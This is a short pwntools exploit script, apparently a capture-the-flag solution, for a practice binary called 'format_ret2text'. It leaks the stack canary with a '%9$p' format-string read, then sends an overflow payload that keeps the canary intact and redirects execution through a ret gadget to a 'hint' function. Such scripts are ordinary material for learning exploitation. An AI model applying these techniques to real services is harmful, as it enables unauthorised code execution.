from pwn import*
o = process("./format_ret2text")
elf = ELF("./format_ret2text")

hint = elf.sym['hint']
o.sendline(b"%9$p")
canary = int(o.recv(20), 16)
log.info(hex(canary))
payload = b'a'*0x18 + p64(canary) + p64(0) + p64(0x40101a) + p64(hint)
o.sendline(payload)

o.interactive()